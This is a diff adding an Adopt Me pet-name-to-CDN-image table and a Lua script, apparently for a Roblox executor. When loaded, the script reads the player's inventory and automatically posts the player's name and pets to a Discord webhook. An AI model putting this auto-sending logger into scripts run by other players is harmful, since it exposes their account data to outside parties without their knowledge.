+    ["Ehecatl"]                        = "aztec_egg_2025_ehecatl",
+    ["Elasmosaurus"]                   = "fossil_2024_elasmosaurus",
+    ["Elephant"]                       = "elephant",
+    ["Emberlight"]                     = "pet_recycler_2025_emberlight",
+    ["Emperor Gorilla"]                = "gorilla_fair_2023_emperor_gorilla",
+    ["Emperor Shrimp"]                 = "summer_2025_emperor_shrimp",
+    ["Emu"]                            = "emu",
+    ["Endangered Egg"]                 = "endangered_2026_endangered_egg",
+    ["English Sheepdog"]               = "farm_2023_sheepdog",
+    ["Ermine"]                         = "winter_2022_ermine",
+    ["Evil Basilisk"]                  = "halloween_2022_evil_basilisk",
+    ["Evil Chick"]                     = "halloween_2024_evil_chick",
+    ["Evil Chickatrice"]               = "halloween_2022_evil_chickatrice",
+    ["Evil Rock"]                      = "halloween_2023_evil_rock",
+    ["Evil Unicorn"]                   = "evil_unicorn",
+    -- F
+    ["Fairy Bat Dragon"]               = "winter_2024_fairy_bat_dragon",
+    ["Fallow Deer"]                    = "woodland_2022_fallow_deer",
+    ["Fanghorn Tortoise"]              = "lunar_2024_fanghorn_tortoise",
+    ["Farm Egg"]                       = "farm_egg",
+    ["Feesh"]                          = "meme_2023_feesh",
+    ["Fennec Fox"]                     = "fennec",
+    ["Field Mouse"]                    = "springfest_2023_field_mouse",
+    ["Fire Foal"]                      = "lny_2026_fire_foal",
+    ["Fire Mare"]                      = "lny_2026_fire_mare",
+    ["Fire Stallion"]                  = "lny_2026_fire_stallion",
+    ["Firefighter Gibbon"]             = "gibbon_2025_firefighter_gibbon",
+    ["Firefly"]                        = "camping_2023_firefly",
+    ["Flaming Fox"]                    = "fire_dimension_2024_flaming_fox",
+    ["Flaming Zebra"]                  = "lures_2023_flaming_zebra",
+    ["Flamingo"]                       = "flamingo",
+    ["Fleur De Ice"]                   = "winter_2023_fleur_de_ice",
+    ["Floral Eggy"]                    = "easter_2024_floral_eggy",
+    ["Flower Power Duckling"]          = "springfest_2023_flower_power_duckling",
+    ["Flying Fish"]                    = "summerfest_2023_flying_fish",
+    ["Fool Egg"]                       = "april_fools_2023_fool_egg",
+    ["Fossa"]                          = "jungle_2023_fossa",
+    ["Fossil Egg"]                     = "fossil_egg",
+    ["Frankenfeline"]                  = "halloween_2024_franken_feline",
+    ["French Bulldog"]                 = "house_pets_2025_french_bulldog",
+    ["Frog"]                           = "frog",
+    ["Frogspawn"]                      = "meme_2023_frogspawn",
+    ["Frost Dragon"]                   = "frost_dragon",
+    ["Frost Fury"]                     = "frost_fury",
+    ["Frost Phoenix"]                  = "winter_2025_frost_phoenix",
+    ["Frost Unicorn"]                  = "modular_castles_2023_frost_unicorn",
+    ["Frostbite Bear"]                 = "ice_dimension_2025_frostbite_bear",
+    ["Frostbite Cub"]                  = "winter_2024_frostbite_cub",
+    ["Frostclaw"]                      = "winter_2024_frostclaw",
+    ["Frozen Penguin"]                 = "ice_dimension_2025_chilly_penguin",
+    -- G
+    ["Gaelic Fae"]                     = "st_patricks_2025_gaelic_fae",
+    ["Galapagos Sea Lion"]             = "endangered_2026_galapagos_sea_lion",
+    ["Garden Egg"]                     = "garden_2024_egg",
+    ["Garden Snake"]                   = "garden_2024_garden_snake",
+    ["Gargoyle"]                       = "urban_2023_gargoyle",
+    ["Gecko"]                          = "seasia_2023_gecko",
+    ["German Shepherd"]                = "inspector_shepherd_2026_german_shepherd",
+    ["Ghost"]                          = "halloween_2023_ghost",
+    ["Ghost Bunny"]                    = "ghost_bunny",
+    ["Ghost Chick"]                    = "halloween_2024_ghost_chick",
+    ["Ghost Dog"]                      = "halloween_2023_ghost_dog",
+    ["Ghost Wolf"]                     = "halloween_2022_ghost_wolf",
+    ["Ghostly Cat"]                    = "halloween_2025_ghostly_cat",
+    ["Giant Anteater"]                 = "jungle_2023_anteater",
+    ["Giant Black Scarab"]             = "desert_2022_black_scarab",
+    ["Giant Blue Scarab"]              = "desert_2022_blue_scarab",
+    ["Giant Gold Scarab"]              = "desert_2022_gold_scarab",
+    ["Giant Panda"]                    = "pet_recycler_2025_giant_panda",
+    ["Gibbon"]                         = "gibbon_2025_gibbon",
+    ["Gila Monster"]                   = "desert_2024_gila_monster",
+    ["Gilded Snake"]                   = "lunar_2025_gilded_snake",
+    ["Ginger Cat"]                     = "ginger_cat",
+    ["Gingerbread Hare"]               = "winter_2023_gingerbread_hare",
+    ["Gingerbread Mouse"]              = "winter_2023_gingerbread_mouse",
+    ["Gingerbread Reindeer"]           = "winter_2022_gingerbread_reindeer",
+    ["Giraffe"]                        = "giraffe",
+    ["Glacier Kitsune"]                = "winter_2023_glacier_kitsune",
+    ["Glacier Moth"]                   = "ugc_rewards_2023_glacier_moth",
+    ["Glormy Dolphin"]                 = "moon_2025_glormy_dolphin",
+    ["Glormy Hound"]                   = "celestial_2024_glormy_hound",
+    ["Glormy Leo"]                     = "celestial_2024_glormy_leo",
+    ["Glyptodon"]                      = "glyptodon",
+    ["Goat"]                           = "pride_2022_goat",
+    ["Gold Mahi Mahi"]                 = "beach_2024_gold_mahi_mahi",
+    ["Golden Albatross"]               = "snow_2022_golden_albatross",
+    ["Golden Chow-Chow"]               = "vip_2022_chow_chow_gold",
+    ["Golden Dragon"]                  = "golden_dragon",
+    ["Golden Egg"]                     = "golden_egg",
+    ["Golden Griffin"]                 = "golden_griffin",
+    ["Golden Hamster"]                 = "hamstertime_2024_golden_hamster",
+    ["Golden Hummingbird"]             = "subscription_2024_gold_hummingbird",
+    ["Golden Jaguar"]                  = "ddlm_2024_golden_jaguar",
+    ["Golden King Penguin"]            = "ice_cream_refresh_2022_golden_king_penguin",
+    ["Golden Ladybug"]                 = "golden_ladybug",
+    ["Golden Penguin"]                 = "golden_penguin",
+    ["Golden Rat"]                     = "golden_rat",
+    ["Golden Tortoise Beetle"]         = "garden_2024_golden_tortoise_beetle",
+    ["Golden Unicorn"]                 = "golden_unicorn",
+    ["Golden Walrus"]                  = "winter_2021_golden_walrus",
+    ["Goldfish"]                       = "pool_2023_goldfish",
+    ["Goldhorn"]                       = "goldhorn",
+    ["Goose"]                          = "springfest_2023_goose",
+    ["Gorilla"]                        = "gorilla_fair_2023_gorilla",
+    ["Grave Owl"]                      = "ddlm_2024_grave_owl",
+    ["Great Pyrenees"]                 = "winter_2024_great_pyrenees",
+    ["Green Amazon"]                   = "rain_2023_green_amazon",
+    ["Green Butterfly"]                = "sanctuary_2022_green_premium_butterfly",
+    ["Green-Chested Pheasant"]         = "fall_2022_pheasant_green",
+    ["Griffin"]                        = "griffin",
+    ["Grim Dragon"]                    = "halloween_2024_grim_dragon",
+    ["Grinmoire"]                      = "sky_ux_2023_grinmoire",
+    ["Ground Sloth"]                   = "ground_sloth",
+    ["Groundhog"]                      = "sofahog_2024_groundhog",
+    ["Guardian Lion"]                  = "guardian_lion",
+    ["Gumball Caterpillar"]            = "sugarfest_2026_gumball_caterpillar",
+    ["Gummy Guana"]                    = "sugarfest_2026_gummy_guana",
+    -- H
+    ["Haetae"]                         = "lunar_2025_haetae",
+    ["Halloween Black Mummy Cat"]      = "halloween_2021_black_mummy_cat",
+    ["Halloween Blue Scorpion"]        = "halloween_2021_scorpion",
+    ["Halloween Evil Dachshund"]       = "halloween_2021_evil_dachshund",
+    ["Halloween Golden Mummy Cat"]     = "halloween_2021_golden_mummy_cat",
+    ["Halloween White Ghost Dragon"]   = "halloween_2021_ghost_dragon",
+    ["Halloween White Mummy Cat"]      = "halloween_2021_white_mummy_cat",
+    ["Halloween White Skeleton Dog"]   = "halloween_2021_skele_dog",
+    ["Hammerhead Shark"]               = "summerfest_2025_hammerhead_shark",
+    ["Hamster"]                        = "hamstertime_2024_hamster",
+    ["Happy Clam"]                     = "summerfest_2023_happy_clam",
+    ["Happy Duckling"]                 = "springfest_2023_happy_duckling",
+    ["Hare"]                           = "springfest_2023_hare",
+    ["Harp Seal"]                      = "winter_2023_harp_seal",
+    ["Hawk"]                           = "woodland_2022_hawk",
+    ["Headless Horse"]                 = "halloween_2024_headless_horse",
+    ["Hedgehog"]                       = "elf_hedgehog",
+    ["Hermit Crab"]                    = "summerfest_2023_hermit_crab",
+    ["Hero Gibbon"]                    = "gibbon_2025_hero_gibbon",
+    ["Highland Cow"]                   = "scottish_2023_highland_cow",
+    ["Hippo"]                          = "danger_2023_hippo",
+    ["Hippogriff"]                     = "gifthat_november_2024_hippogriff",
+    ["Honey Badger"]                   = "ugc_refresh_2024_honey_badger",
+    ["Hopbop"]                         = "moon_2025_hopbop",
+    ["Horse"]                          = "horse",
+    ["Hot Doggo"]                      = "summerfest_2023_hotdog_dog",
+    ["Humbug"]                         = "winter_2025_humbug",
+    ["Hummingbird"]                    = "subscription_2024_hummingbird",
+    ["Husky"]                          = "winter_2021_husky",
+    ["Hydra"]                          = "hydra",
+    ["Hyena"]                          = "hyena",
+    -- I
+    ["Ibex"]                           = "random_pets_2022_ibex",
+    ["Ibis"]                           = "japan_2022_ibis",
+    ["Ice Cream Hermit Crab"]          = "summerfest_2023_ice_cream_crab",
+    ["Ice Cube"]                       = "winter_2024_ice_cube",
+    ["Ice Golem"]                      = "winter_2021_ice_golem",
+    ["Ice Moth Dragon"]                = "winter_2022_ice_moth_dragon",
+    ["Ice Wolf"]                       = "winter_2022_ice_wolf",
+    ["Icy Porcupine"]                  = "ice_dimension_2025_icy_porcupine",
+    ["Indian Flying Fox"]              = "halloween_2024_indian_flying_fox",
+    ["Indian Leopard"]                 = "urban_2023_indian_leopard",
+    ["Influencer Gibbon"]              = "gibbon_2025_influencer_gibbon",
+    ["Inmate Capuchin Monkey"]         = "capuchin_2024_inmate_capuchin_monkey",
+    ["Irish Elk"]                      = "winter_2022_irish_elk",
+    ["Irish Water Spaniel"]            = "ugc_rewards_2022_irish_water_spaniel",
+    ["Island Tarsier"]                 = "summerfest_2025_island_tarsier",
+    -- J
+    ["Japan Egg"]                      = "japan_2022_egg",
+    ["Japanese Snow Fairy"]            = "winter_2025_japanese_snow_fairy",
+    ["Jekyll Hydra"]                   = "halloween_2024_jekyll_hydra",
+    ["Jellyfish"]                      = "ugc_refresh_2024_jellyfish",
+    ["Jousting Horse"]                 = "halloween_2022_jousting_horse",
+    ["Jumping Spider"]                 = "halloween_2025_spider",
+    ["Jungle Egg"]                     = "jungle_egg",
+    -- K
+    ["Kage Crow"]                      = "spring_2025_kage_crow",
+    ["Kaijunior"]                      = "spring_2025_spotted_kaijunior",
+    ["Kakapo"]                         = "endangered_2026_kakapo",
+    ["Kangaroo"]                       = "kangaroo",
+    ["Kappakid"]                       = "spring_2025_kappakid",
+    ["Karate Gorilla"]                 = "gorilla_fair_2023_karate_gorilla",
+    ["Kelp Captain"]                   = "summerfest_2025_kelp_captain",
+    ["Kelp Crewmate"]                  = "summerfest_2025_kelp_crewmate",
+    ["Kelp Hunter"]                    = "summerfest_2025_kelp_hunter",
+    ["Kelp Raider"]                    = "summerfest_2025_kelp_raider",
+    ["Kid Goat"]                       = "summerfest_2024_kid_goat",
+    ["King Bee"]                       = "king_bee",
+    ["King Penguin"]                   = "ice_cream_refresh_2022_king_penguin",
+    ["Kirin"]                          = "kirin",
+    ["Kitsune"]                        = "kitsune",
+    ["Kitty Bat"]                      = "halloween_2025_bat_cat",
+    ["Kiwi"]                           = "kiwi_2023_kiwi",
+    ["Koala"]                          = "koala",
+    ["Koi Carp"]                       = "japan_2022_koi_carp",
+    ["Komodo Dragon"]                  = "seasia_2023_komodo_dragon",
+    ["Kookaburra"]                     = "aussie_2024_kookaburra",
+    ["Kraken"]                         = "ocean_2024_kraken",
+    -- L
+    ["Ladybug"]                        = "ladybug",
+    ["Lamb"]                           = "lamb",
+    ["Lammergeier"]                    = "danger_2023_lammergeier",
+    ["Lava Dragon"]                    = "halloween_2022_lava_dragon",
+    ["Lava Wolf"]                      = "halloween_2022_lava_wolf",
+    ["Lavender Dragon"]                = "lavender_dragon",
+    ["Leopard Cat"]                    = "japan_2022_leopard_cat",
+    ["Leopard Shark"]                  = "summerfest_2023_leopard_shark",
+    ["Leviathan"]                      = "summerfest_2023_leviathan",
+    ["Liger"]                          = "danger_2023_liger",
+    ["Lion"]                           = "lion",
+    ["Lion Cub"]                       = "ugc_refresh_2023_lion_cub",
+    ["Lionfish"]                       = "ocean_2024_lionfish",
+    ["Llama"]                          = "llama",
+    ["Lobster"]                        = "summerfest_2023_lobster",
+    ["Longhorn Cow"]                   = "farm_2023_longhorn_cow",
+    ["Love Bird"]                      = "valentines_2025_love_bird",
+    ["Lunar Gold Tiger"]               = "lny_2022_tiger_gold",
+    ["Lunar Moon Bear"]                = "lny_2023_moon_moon_bear",
+    ["Lunar Ox"]                       = "lunar_ox",
+    ["Lunar Tiger"]                    = "lny_2022_tiger",
+    ["Lunar White Tiger"]              = "lny_2022_tiger_white",
+    ["Lynx"]                           = "lynx",
+    -- M
+    ["Magma Moose"]                    = "lures_2023_magma_moose",
+    ["Magma Snail"]                    = "lures_2023_magma_snail",
+    ["Magpie"]                         = "inspector_shepherd_2026_magpie",
+    ["Mahi Mahi"]                      = "beach_2024_mahi_mahi",
+    ["Maine Coon"]                     = "winter_2025_maine_coon",
+    ["Majestic Pony"]                  = "summerfest_2024_majestic_pony",
+    ["Malayan Tapir"]                  = "seasia_2023_malaysian_tapir",
+    ["Maleo Bird"]                     = "seasia_2023_maleo_bird",
+    ["Maneki-Neko"]                    = "japan_2022_maneki_neko",
+    ["Manta Ray"]                      = "summerfest_2025_manta_ray",
+    ["Many Mackerel"]                  = "summerfest_2023_mackerel_shoal",
+    ["Marabou Stork"]                  = "halloween_2024_marabou_stork",
+    ["Mecha Meow"]                     = "bfriday_2023_mecha_meow",
+    ["Mecha R4BBIT"]                   = "spring_2025_mechapips",
+    ["Mechapup"]                       = "april_fools_2022_mechapup",
+    ["Meerkat"]                        = "meerkat",
+    ["Merhorse"]                       = "merhorse",
+    ["Mermicorn"]                      = "summerfest_2025_mermicorn",
+    ["Merry Mistletroll"]              = "winter_2024_merry_mistletroll",
+    ["Metal Ox"]                       = "metal_ox",
+    ["Mexican Wolf"]                   = "endangered_2026_mexican_wolf",
+    ["Midnight Dragon"]                = "lunar_2024_midnight_dragon",
+    ["Mini Pig"]                       = "summerfest_2024_minipig",
+    ["Mini Schnauzer"]                 = "house_pets_2025_mini_schnauzer",
+    ["Mirai Moth"]                     = "spring_2025_mirai_moth",
+    ["Mistletroll"]                    = "winter_2024_mistletroll",
+    ["Mochi Meow"]                     = "sugarfest_2026_mochi_meow",
+    ["Mole"]                           = "garden_2024_mole",
+    ["Momma Moose"]                    = "camping_2025_mama_moose",
+    ["Mongoose"]                       = "urban_2023_mongoose",
+    ["Monkey"]                         = "monkey",
+    ["Monkey King"]                    = "monkey_king",
+}
+
+-- =====================
+--   GET IMAGE URL
+-- =====================
+local function getImage(petName)
+    local file = PetCDN[petName]
+    if file then
+        return CDN .. file .. ".png"
+    end
+    -- fallback: try snake_case guess
+    local guess = petName:lower():gsub("[%-%s]+", "_"):gsub("[^%w_]", "")
+    return CDN .. guess .. ".png"
+end
+
+-- =====================
+--  SEND WEBHOOK
+-- =====================
+local function sendWebhook(payload)
+    local ok, err = pcall(function()
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = game:GetService("HttpService"):JSONEncode(payload)
+        })
+    end)
+    if not ok then
+        warn("[Webhook] Failed: " .. tostring(err))
+    end
+end
+
+-- =====================
+--  INVENTORY SCAN
+-- =====================
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function scanAndSend()
+    local petList = {}
+
+    -- scan backpack
+    local backpack = LocalPlayer:FindFirstChild("Backpack")
+    if backpack then
+        for _, item in backpack:GetChildren() do
+            table.insert(petList, item.Name)
+        end
+    end
+
+    -- scan equipped (character)
+    local char = LocalPlayer.Character
+    if char then
+        for _, item in char:GetChildren() do
+            if item:IsA("Tool") then
+                table.insert(petList, item.Name)
+            end
+        end
+    end
+
+    if #petList == 0 then
+        print("[Webhook] No pets found in inventory.")
+        return
+    end
+
+    -- Build embeds (max 10 per message due to Discord limits)
+    local embeds = {}
+    for i, petName in ipairs(petList) do
+        if i > 10 then break end -- Discord max 10 embeds
+
+        local imgUrl = getImage(petName)
+        local found = PetCDN[petName] ~= nil
+
+        table.insert(embeds, {
+            title = petName,
+            color = found and 0x00ff88 or 0xff8800,
+            thumbnail = { url = imgUrl },
+            footer = { text = found and "✅ CDN Match" or "⚠️ Guessed URL" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        })
+    end
+
+    local payload = {
+        username = "Adopt Me Pet Scanner",
+        avatar_url = "https://cdn.playadopt.me/items/cat.png",
+        content = ("📦 **%s's Inventory** — **%d** pet(s) found"):format(
+            LocalPlayer.Name, #petList
+        ),
+        embeds = embeds
+    }
+
+    sendWebhook(payload)
+    print(("[Webhook] Sent %d pets to webhook!"):format(#petList))
+end
+
+-- =====================
+--     RUN TEST
+-- =====================
+print("[AdoptMe CDN] Script loaded! Scanning inventory...")
+task.wait(1)
+scanAndSend()
